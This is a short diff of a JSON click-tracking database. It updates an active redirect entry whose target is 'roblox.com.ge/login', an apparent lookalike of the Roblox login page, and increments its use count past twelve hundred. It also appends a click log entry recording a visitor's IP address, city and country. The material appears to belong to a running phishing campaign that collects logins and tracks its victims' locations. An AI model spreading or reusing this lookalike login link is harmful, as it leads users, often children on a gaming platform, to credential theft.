@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1241,
+    "useCount": 1242,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10072,6 +10072,14 @@
         "city": "Lithonia",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777339728236,
+        "ip": "45.228.150.0",
+        "country": "Brazil",
+        "city": "Cuiabá",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
